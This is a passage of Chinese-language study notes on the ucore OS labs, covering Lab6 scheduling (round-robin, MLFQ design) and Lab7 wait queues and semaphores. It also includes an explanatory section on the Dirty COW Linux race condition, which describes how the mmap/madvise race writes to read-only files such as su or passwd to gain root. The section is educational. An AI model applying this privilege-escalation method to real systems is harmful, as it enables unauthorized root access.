class="hljs-number">0</span>;<br>failed:<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></div></td></tr></table></figure></li></ul><h4 id="3-Dirty-COW浅析"><a href="#3-Dirty-COW浅析" class="headerlink" title="3.Dirty COW浅析"></a>3.Dirty COW浅析</h4><h5 id="0x00-关于linux内核背景知识"><a href="#0x00-关于linux内核背景知识" class="headerlink" title="0x00 关于linux内核背景知识"></a>0x00 关于linux内核背景知识</h5><p>和ucore非常相似, 比如mm_struct, vma, copy_range一些函数. 下面是这个漏洞的相关背景.</p><ul><li><a href="https://man7.org/linux/man-pages/man2/madvise.2.html">madvise</a>(): 内核对该区域的用户虚拟内存应遵循特定的使用模式<ul><li>MADV_DONTNEED参数:</li></ul></li><li><a href="https://man7.org/linux/man-pages/man2/mmap.2.html">mmap</a>():<ul><li>MAP_PRIVATE参数: Create a private copy-on-write mapping.  Updates to the mapping are not visible to other processes mapping the same file, and are not carried through to the underlying file. </li></ul></li></ul><h5 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h5><p>该漏洞是Linux的一个本地提权漏洞，发现者是Phil Oester，影响&gt;=2.6.22的所有Linux内核版本，修复时间是2016年10月18号。该漏洞的原因是<code>get_user_page</code>内核函数在处理<code>Copy-on-Write</code>(以下使用COW表示)的过程中，可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。当我们向带有MAP_PRIVATE标记的只读文件映射区域写数据时，会产生一个映射文件的复制(COW)，对此区域的任何修改都不会写回原来的文件，如果上述的竞态条件发生，就能成功的写回原来的文件。比如我们修改su或者passwd程序就可以达到root的目的。</p><blockquote><p>Pocsuite 是由知道创宇404实验室打造的一款开源的远程漏洞测试框架</p></blockquote><h5 id="0x02-POC分析"><a href="#0x02-POC分析" class="headerlink" title="0x02 POC分析"></a>0x02 POC分析</h5><p>首先打开我们需要修改的只读文件并使用<code>MAP_PRIVATE</code>标记映射文件到内存区域，然后启动两个线程：</p><ul><li>其中一个线程向文件映射的内存区域写数据，这时内核采用COW机制。</li><li>另一个线程使用带MADV_DONTNEED参数的madvise系统调用将文件映射内存区域释放，达到干扰另一个线程的COW过程，产生竞态条件，</li></ul><p>当竞态条件发生时就能写入文件成功。</p><h5 id="0x03-大致流程"><a href="#0x03-大致流程" class="headerlink" title="0x03 大致流程"></a>0x03 大致流程</h5><p>当我们用mmap去映射文件到内存区域时使用了<code>MAP_PRIVATE</code>标记，我们写文件时会写到COW机制产生的内存区域中，原文件不受影响。其中获取用户进程内存页的过程如下：</p><ol><li>第一次调用<code>follow_page_mask</code>查找虚拟地址对应的page，带有<code>FOLL_WRITE</code>标记。因为所在page不在内存中，<code>follow_page_mask</code>返回NULL，第一次失败，进入<code>faultin_page</code>，最终进入<code>do_cow_fault</code>分配不带<code>_PAGE_RW</code>标记的匿名内存页，返回值为0。</li><li>重新开始循环，第二次调用<code>follow_page_mask</code>，带有<code>FOLL_WRITE</code>标记。由于不满足<code>((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte))</code>条件，<code>follow_page_mask</code>返回NULL，第二次失败，进入<code>faultin_page</code>，最终进入<code>do_wp_page</code>函数分配COW页。并在上级函数<code>faultin_page</code>中去掉<code>FOLL_WRITE</code>标记,返回0。</li><li>重新开始循环，第三次调用<code>follow_page_mask</code>，不带<code>FOLL_WRITE</code>标记。成功得到page。</li></ol><p>产生竞态条件:</p><ol><li>第一次<code>follow_page_mask(FOLL_WRITE)</code>，page不在内存中，进行pagefault处理。</li><li>第二次<code>follow_page_mask(FOLL_WRITE)</code>，page没有写权限，并去掉<code>FOLL_WRITE</code>。</li><li>另一个线程释放上一步分配的COW页</li><li>第三次<code>follow_page_mask(无FOLL_WRITE)</code>，page不在内存中，进行pagefault处理。</li><li>第四次<code>follow_page_mask(无FOLL_WRITE)</code>,成功返回page，但没有使用COW机制。</li></ol><h1 id="Lab6"><a href="#Lab6" class="headerlink" title="Lab6"></a>Lab6</h1><h2 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h2><h3 id="0-项目组成-2"><a href="#0-项目组成-2" class="headerlink" title="0.项目组成"></a>0.项目组成</h3><p>相对与实验五，实验六主要增加的文件如上表红色部分所示，主要修改的文件如上表紫色部分所示。主要改动如下： 简单说明如下：</p><ul><li>libs/skew_heap.h: 提供了基本的优先队列数据结构，为本次实验提供了抽象数据结构方面的支持。</li><li>kern/process/proc.[ch]：proc.h中扩展了proc_struct的成员变量，用于RR和stride调度算法。proc.c中实现了lab6_set_priority，用于设置进程的优先级。</li><li>kern/schedule/{sched.h,sched.c}: 定义了 ucore 的调度器框架，其中包括相关的数据结构（包括调度器的接口和运行队列的结构），和具体的运行时机制。</li><li>kern/schedule/{default_sched.h,default_sched.c}: 具体的 round-robin 算法，在本次实验中你需要了解其实现。</li><li>kern/schedule/default_sched_stride_c: Stride Scheduling调度器的基本框架，在此次实验中你需要填充其中的空白部分以实现一个完整的 Stride 调度器。</li><li>kern/syscall/syscall.[ch]: 增加了sys_gettime系统调用，便于用户进程获取当前时钟值；增加了sys_lab6_set_priority系统调用，便于用户进程设置进程优先级（给priority.c用）</li><li>user/{matrix.c,priority.c,. . . }: 相关的一些测试用户程序，测试调度算法的正确性，user目录下包含但不限于这些程序。在完成实验过程中，建议阅读这些测试程序，以了解这些程序的行为，便于进行调试。</li></ul><h3 id="1-流程概述"><a href="#1-流程概述" class="headerlink" title="1.流程概述"></a>1.流程概述</h3><p>实验中涉及了idle进程的概念。当cpu没有进程可以执行的时候，系统应该如何工作？在实验五的scheduler实现中，ucore内核不断的遍历进程池，直到找到第一个runnable状态的 process，调用并执行它。也就是说，当系统没有进程可以执行的时候，它会把所有 cpu 时间用在搜索进程池，以实现 idle的目的。但是这样的设计不被大多数操作系统所采用，原因在于它将进程调度和 idle 进程两种不同的概念混在了一起，而且，当调度器比较复杂时，schedule 函数本身也会比较复杂，这样的设计结构很不清晰而且难免会出现错误。所以在此次实验中，ucore建立了一个单独的进程(kern/process/proc.c 中的 idleproc)作为 cpu 空闲时的 idle 进程，这个程序是通常一个死循环。你需要了解这个程序的实现。</p><h3 id="2-新增的内容"><a href="#2-新增的内容" class="headerlink" title="2.新增的内容"></a>2.新增的内容</h3><p>ucore定义的进程控制块struct proc_struct包含了成员变量state,用于描述进程的运行状态，而running和runnable共享同一个状态(state)值PROC_RUNNABLE。</p><p>Lab5中有一个全局变量<code>list_entry_t proc_list</code>, 用来存放所有的进程, wakeup_proc()函数只要设置进程为PROC_RUNNABLE, 然后调度函数再遍历proc_list就能取出下一个进程.</p><p>在Lab6中，runnable的进程会被放在运行队列<code>struct run_queue *rq</code>中。值得注意的是，不同之处在于处于running态的进程不会放在运行队列中, 会被直接dequeue.</p><h2 id="练习-3"><a href="#练习-3" class="headerlink" title="练习"></a>练习</h2><h3 id="练习0-1"><a href="#练习0-1" class="headerlink" title="练习0"></a>练习0</h3><blockquote><p>填写前几个lab的代码并且补充一些内容</p></blockquote><p>遇到了大问题, 最后clone了肖佬的Lab6, 然后改成我自己的代码才过了编译. 实在无法理解为什么会在check_pgfault()这函数上出错.</p><h3 id="练习1-3"><a href="#练习1-3" class="headerlink" title="练习1"></a>练习1</h3><blockquote><p>分析了解lab6采用RR调度算法后的执行过程</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// The introduction of scheduling classes is borrrowed from Linux, and makes the </span><br><span class="hljs-comment">// core scheduler quite extensible. These classes (the scheduler modules) encapsulate </span><br><span class="hljs-comment">// the scheduling policies. </span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sched_class</span> &#123;</span><br>    <span class="hljs-comment">// the name of sched_class</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name;<br>    <span class="hljs-comment">// Init the run queue</span><br>    <span class="hljs-keyword">void</span> (*init)(struct run_queue *rq);<br>    <span class="hljs-comment">// put the proc into runqueue, and this function must be called with rq_lock</span><br>    <span class="hljs-keyword">void</span> (*enqueue)(struct run_queue *rq, struct proc_struct *proc);<br>    <span class="hljs-comment">// get the proc out runqueue, and this function must be called with rq_lock</span><br>    <span class="hljs-keyword">void</span> (*dequeue)(struct run_queue *rq, struct proc_struct *proc);<br>    <span class="hljs-comment">// choose the next runnable task</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *(*<span class="hljs-title">pick_next</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">run_queue</span> *<span class="hljs-title">rq</span>);</span><br>    <span class="hljs-comment">// dealer of the time-tick</span><br>    <span class="hljs-keyword">void</span> (*proc_tick)(struct run_queue *rq, struct proc_struct *proc);<br>    <span class="hljs-comment">/* for SMP support in the future</span><br><span class="hljs-comment">     *  load_balance</span><br><span class="hljs-comment">     *     void (*load_balance)(struct rq* rq);</span><br><span class="hljs-comment">     *  get some proc from this rq, used in load_balance,</span><br><span class="hljs-comment">     *  return value is the num of gotten proc</span><br><span class="hljs-comment">     *  int (*get_proc)(struct rq* rq, struct proc* procs_moved[]);</span><br><span class="hljs-comment">     */</span><br>&#125;;<br><br></code></pre></div></td></tr></table></figure><p>上面的代码即为sched_class, 如果要使用函数指针只要sched_class-&gt;init(…)这样即可</p><p>时间片轮转算法在os_kernel_lab\labcodes\lab6\kern\schedule\default_sched.c中, 给每个进程分配时间片的FCFS算法, 简单的入队出队, RR_proc_tick()自减剩余时间片, 判断是否为零, 设置need_resched=1等等, 并不复杂.</p><p>在实验报告中完成：</p><ul><li>请理解并分析sched_class中各个函数指针的用法，并结合Round Robin 调度算法描ucore的调度执行过程</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">schedule</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">bool</span> intr_flag;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">next</span>;</span><br>    local_intr_save(intr_flag);  <span class="hljs-comment">//inhibit interrupt</span><br>    &#123;<br>        current-&gt;need_resched = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (current-&gt;state == PROC_RUNNABLE) &#123;<br>            <span class="hljs-comment">//change from list search to function</span><br>            sched_class_enqueue(current);<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((next = sched_class_pick_next()) != <span class="hljs-literal">NULL</span>) &#123;<br>            sched_class_dequeue(next);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (next == <span class="hljs-literal">NULL</span>) &#123;<br>            next = idleproc;<br>        &#125;<br>        next-&gt;runs ++;<br>        <span class="hljs-keyword">if</span> (next != current) &#123;<br>            proc_run(next);<br>        &#125;<br>    &#125;<br>    local_intr_restore(intr_flag);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>首先是schedule函数, 他被调用的函数在下表:</p><table><thead><tr><th>编号</th><th>位置</th><th>原因</th></tr></thead><tbody><tr><td>1</td><td>proc.c::do_exit</td><td>用户线程执行结束，主动放弃CPU控制权。</td></tr><tr><td>2</td><td>proc.c::do_wait</td><td>用户线程等待子进程结束，主动放弃CPU控制权。</td></tr><tr><td>3</td><td>proc.c::init_main</td><td>1. initproc内核线程等待所有用户进程结束，如果没有结束，就主动放弃CPU控制权; 2. initproc内核线程在所有用户进程结束后，让kswapd内核线程执行10次，用于回收空闲内存资源</td></tr><tr><td>4</td><td>proc.c::cpu_idle</td><td>idleproc内核线程的工作就是等待有处于就绪态的进程或线程，如果有就调用schedule函数</td></tr><tr><td>5</td><td>sync.h::lock</td><td>在获取锁的过程中，如果无法得到锁，则主动放弃CPU控制权</td></tr><tr><td>6</td><td>trap.c::trap</td><td>如果在当前进程在用户态被打断去，且当前进程控制块的成员变量need_resched设置为1，则当前线程会放弃CPU控制权(<strong>这个感觉挺特别的, 如果需要被调度, 那么只要因为个什么软中断跳转到内核状态进行执行的时候就会放弃控制权. 这实际上体现了对用户进程的可抢占性, 而且是随机抢占</strong>)</td></tr></tbody></table><p>选取下一个完成之后, next变量作为proc_run()的参数进而执行next中的进程.</p><ul><li>请在实验报告中简要说明如何设计实现”多级反馈队列调度算法“，给出概要设计，鼓励给出详细设计</li></ul><p><strong>多级反馈队列算法（MLFQ)</strong> </p><p>进程可<strong>在不同队列间移动</strong>的多级队列算法, 时间片大小随优先级级别的增加而增加,<br>例如进程在当前时间片内没有完成，则降到下一个优先级。</p><p>特征：CPU密集型进程优先级下降的很快，IO密集型进程停留在高优先级</p><p><strong>大概设计:</strong> </p><p>多级反馈队列要有多个<code>run_queue</code>, 每个queue的时间片不同.</p><blockquote><p>假设有三个run_queue, rq0, rq1, rq2, 固定时间片为5, 队列间调度使用RR算法, 时间片长度为10, 8, 6</p></blockquote><ul><li><p>sched_init(): 首先list_init()一下三个rq, 将函数指针结构体赋值一下, 设置当前rq=rq0</p></li><li><p>sched_class_proc_tick: 在时钟中断里被调用, 如果当前时间片用完了, 则设置need_resched为1</p></li><li><p>sched_pick_next: 判断当前queue时间片以及当前进程时间片是否用完, 前者用完则rq切换到下一个queue, 后者用完rq不变, 从rq取出第一个进程</p></li><li><p>sched_enqueue: 通过run_times判断为CPU密集或者IO密集, 通过设定阈值来加入到三个不同的queu中</p></li><li><p>sched_dequeue: delete就完事了</p></li></ul><h3 id="练习2-3"><a href="#练习2-3" class="headerlink" title="练习2"></a>练习2</h3><p><a href="http://www.waldspurger.org/carl/papers/phd-mit-tr667.pdf">stride算法论文</a> </p><h3 id="Challenge-1-1"><a href="#Challenge-1-1" class="headerlink" title="Challenge 1"></a>Challenge 1</h3><blockquote><p>实现 Linux 的 CFS 调度算法</p></blockquote><h1 id="Lab7"><a href="#Lab7" class="headerlink" title="Lab7"></a>Lab7</h1><h2 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h2><h3 id="00-基础原理"><a href="#00-基础原理" class="headerlink" title="00.基础原理"></a>00.<a href="https://kiprey.github.io/2020/09/uCore-7/#%E7%9F%A5%E8%AF%86%E7%82%B9">基础原理</a></h3><h3 id="0-项目组成-3"><a href="#0-项目组成-3" class="headerlink" title="0.项目组成"></a>0.项目组成</h3><ul><li>kern/schedule/{sched.h,sched.c}: 增加了定时器（timer）机制，用于进程/线程的do_sleep功能。</li><li>kern/sync/sync.h: <strong>去除了lock实现（这对于不抢占内核没用。</strong> </li><li>kern/sync/wait.[ch]: 定义了等待队列wait_queue结构和等待entry的wait结构以及在此之上的函数，这是ucore中的信号量semophore机制和条件变量机制的基础，在本次实验中你需要了解其实现。</li><li>kern/sync/sem.[ch]:定义并实现了ucore中内核级信号量相关的数据结构和函数，本次试验中你需要了解其中的实现，并基于此完成内核级条件变量的设计与实现。</li><li>user/ libs/ {syscall.[ch],ulib.[ch] }与kern/sync/syscall.c：实现了进程sleep相关的系统调用的参数传递和调用关系。</li><li>user/{ sleep.c,sleepkill.c}: 进程睡眠相关的一些测试用户程序。</li><li>kern/sync/monitor.[ch]:基于管程的条件变量的实现程序，在本次实验中是练习的一部分，要求完成。</li><li>kern/sync/check_sync.c：实现了基于管程的哲学家就餐问题，在本次实验中是练习的一部分，要求完成基于管程的哲学家就餐问题。</li><li>kern/mm/vmm.[ch]：用信号量mm_sem取代mm_struct中原有的mm_lock。（本次实验不用管）</li></ul><h3 id="1-定时器相关"><a href="#1-定时器相关" class="headerlink" title="1.定时器相关"></a>1.定时器相关</h3><p>在<code>sched.h</code>中定义了定时器中断相关的函数:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sched_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wakeup_proc</span><span class="hljs-params">(struct proc_struct *proc)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">schedule</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">add_timer</span><span class="hljs-params">(<span class="hljs-keyword">timer_t</span> *timer)</span></span>;     <span class="hljs-comment">// add timer to timer_list</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">del_timer</span><span class="hljs-params">(<span class="hljs-keyword">timer_t</span> *timer)</span></span>;     <span class="hljs-comment">// del timer from timer_list</span><br><span class="hljs-comment">// call scheduler to update tick related info, and check the timer is expired? If expired, then wakup proc</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">run_timer_list</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br></code></pre></div></td></tr></table></figure><p>add_timer函数只在do_sleep中会被用到, 用于设定sleep的时长, 然后通过时钟中断里的run_timer_lsit来找到expired的进程, 从而继续执行.</p><h3 id="2-等待队列实现"><a href="#2-等待队列实现" class="headerlink" title="2.等待队列实现"></a>2.等待队列实现</h3><h4 id="基本结构和函数"><a href="#基本结构和函数" class="headerlink" title="基本结构和函数"></a>基本结构和函数</h4><p>需要等待事件的进程在转入休眠状态后插入到等待队列中。当事件发生之后，内核遍历相应等待队列，唤醒休眠的用户进程或内核线程，并设置其状态为就绪状态（PROC_RUNNABLE），并将该进程从等待队列中清除。ucore在kern/sync/{ wait.h, wait.c }中实现了等待项wait结构和等待队列wait queue结构以及相关函数），这是实现ucore中的信号量机制和条件变量机制的基础</p><blockquote><p>总结一下, 到目前为止出现了几个queue, 一个是放着所有进程的proc_list, 用于get_pid(), kern_thread()等等函数; 第二个是<code>struct run_queue *rq</code>, 即运行队列, 当然不仅仅只是一个链表头, 也可以是heap的head; 第三个是这里的等待队列wait_queue, 实现在下面:</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-string">&quot;数据结构&quot;</span><br><span class="hljs-keyword">typedef</span>  <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">proc</span>;</span>     <span class="hljs-comment">//等待进程的指针</span><br>    <span class="hljs-keyword">uint32_t</span> wakeup_flags;        <span class="hljs-comment">//进程被放入等待队列的原因标记</span><br>    <span class="hljs-keyword">wait_queue_t</span> *wait_queue;     <span class="hljs-comment">//指向此wait结构所属于的wait_queue</span><br>    <span class="hljs-keyword">list_entry_t</span> wait_link;       <span class="hljs-comment">//用来组织wait_queue中wait节点的连接</span><br>&#125; <span class="hljs-keyword">wait_t</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-keyword">list_entry_t</span> wait_head;       <span class="hljs-comment">//wait_queue的队头</span><br>&#125; <span class="hljs-keyword">wait_queue_t</span>;<br><br>le2wait(le, member)               <span class="hljs-comment">//实现wait_t中成员的指针向wait_t 指针的转化</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-string">&quot;底层相关函数, 定义queue级别的操作, wakeup等操作是由高层函数实现的&quot;</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wait_init</span><span class="hljs-params">(<span class="hljs-keyword">wait_t</span> *wait, struct proc_struct *proc)</span></span>;    <span class="hljs-comment">//初始化wait结构</span><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">wait_in_queue</span><span class="hljs-params">(<span class="hljs-keyword">wait_t</span> *wait)</span></span>;                          <span class="hljs-comment">//wait是否在wait queue中</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wait_queue_init</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>)</span></span>;                 <span class="hljs-comment">//初始化wait_queue结构</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wait_queue_add</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>, <span class="hljs-keyword">wait_t</span> *wait)</span></span>;    <span class="hljs-comment">//把wait前插到wait queue中</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wait_queue_del</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>, <span class="hljs-keyword">wait_t</span> *wait)</span></span>;    <span class="hljs-comment">//从wait queue中删除wait</span><br><span class="hljs-comment">//下两个参数中的queue用于assert检查</span><br><span class="hljs-function"><span class="hljs-keyword">wait_t</span> *<span class="hljs-title">wait_queue_next</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>, <span class="hljs-keyword">wait_t</span> *wait)</span></span>;<span class="hljs-comment">//取得wait的后一个链接指针</span><br><span class="hljs-function"><span class="hljs-keyword">wait_t</span> *<span class="hljs-title">wait_queue_prev</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>, <span class="hljs-keyword">wait_t</span> *wait)</span></span>;<span class="hljs-comment">//取得wait的前一个链接指针</span><br><span class="hljs-function"><span class="hljs-keyword">wait_t</span> *<span class="hljs-title">wait_queue_first</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>)</span></span>;             <span class="hljs-comment">//取得wait queue的第一个wait</span><br><span class="hljs-function"><span class="hljs-keyword">wait_t</span> *<span class="hljs-title">wait_queue_last</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>)</span></span>;              <span class="hljs-comment">//取得wait queue的最后一个wait</span><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">wait_queue_empty</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>)</span></span>;                <span class="hljs-comment">//wait queue是否为空</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-string">&quot;高层函数&quot;</span><br><span class="hljs-comment">//让wait与进程关联，且让当前进程关联的wait进入等待队列queue，当前进程睡眠</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wait_current_set</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>, <span class="hljs-keyword">wait_t</span> *wait, <span class="hljs-keyword">uint32_t</span> wait_state)</span></span>;<br><span class="hljs-comment">//把与当前进程关联的wait从等待队列queue中删除</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wait_current_del</span><span class="hljs-params">(<span class="hljs-built_in">queue</span>, wait)</span></span>;<br><span class="hljs-comment">//下面三个函数中的del是指是否删除</span><br><span class="hljs-comment">//唤醒与wait关联的进程, 调用wakeup_proc()-&gt;sche_class_enqueue()把proc加入到rq里</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wakeup_wait</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>, <span class="hljs-keyword">wait_t</span> *wait, <span class="hljs-keyword">uint32_t</span> wakeup_flags, <span class="hljs-keyword">bool</span> del)</span></span>;<br><span class="hljs-comment">//唤醒等待队列上挂着的第一个wait所关联的进程</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wakeup_first</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>, <span class="hljs-keyword">uint32_t</span> wakeup_flags, <span class="hljs-keyword">bool</span> del)</span></span>;<br><span class="hljs-comment">//唤醒等待队列上所有的等待的进程, 会调用wakeup_wait和wait_queue_first(next)</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wakeup_queue</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>, <span class="hljs-keyword">uint32_t</span> wakeup_flags, <span class="hljs-keyword">bool</span> del)</span></span>;<br></code></pre></div></td></tr></table></figure><p>内核前面的流程还是一样的, 由proc_init()函数创建第一个内核进程idleproc, 然后调用kern_thread()创建第二个内核进程initproc, 这个进程会执行init_main函数. 但是一切都还未发生, 直到cpu_idle()函数发现当前(idleproc)的need_resched==1, 换成initproc开始执行, 在这个lab中init_main加上了check_sync()用来检查哲学家思考问题.</p><p>下面是调用关系示例:</p><h4 id="up-V操作"><a href="#up-V操作" class="headerlink" title="__up(): V操作"></a>__up(): V操作</h4><p><img src="../../image/ucore/up.gif" alt="up"></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> __noinline <span class="hljs-keyword">void</span> __up(<span class="hljs-keyword">semaphore_t</span> *sem, <span class="hljs-keyword">uint32_t</span> wait_state) &#123;<br>    <span class="hljs-keyword">bool</span> intr_flag;<br>    local_intr_save(intr_flag);<br>    &#123;<span class="hljs-comment">//屏蔽中断</span><br>        <span class="hljs-keyword">wait_t</span> *wait;<br>        <span class="hljs-keyword">if</span> ((wait = wait_queue_first(&amp;(sem-&gt;wait_queue))) == <span class="hljs-literal">NULL</span>) <br>        &#123;<span class="hljs-comment">//意味着没有等待的进程</span><br>            sem-&gt;value ++;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//否则要唤醒</span><br>            wakeup_wait(&amp;(sem-&gt;wait_queue), wait, wait_state, <span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>    local_intr_restore(intr_flag);<br><br></code></pre></div></td></tr></table></figure><h4 id="down-P操作"><a href="#down-P操作" class="headerlink" title="__down(): P操作"></a>__down(): P操作</h4><p><img src="../../image/ucore/down.gif" alt="down"></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span 